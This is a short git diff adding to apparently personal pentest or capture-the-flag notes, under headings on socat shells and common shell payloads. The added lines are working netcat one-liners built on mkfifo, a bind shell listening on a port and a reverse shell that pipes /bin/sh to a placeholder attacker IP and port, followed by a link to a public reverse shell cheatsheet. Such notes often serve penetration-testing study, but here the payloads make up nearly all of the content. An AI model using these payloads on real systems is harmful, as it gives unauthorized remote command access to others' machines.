@@ -28,8 +28,13 @@ stty cols numver   //set in shell
 ```
 ### Socat Encrypted Shells 
 ### Common Shell Payloads 
+
+a bit of vague***   
+
 command:  
 ```
+mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f   //a bit of hard, but don't worry
 
+mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
 [PayloadAllTheThing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
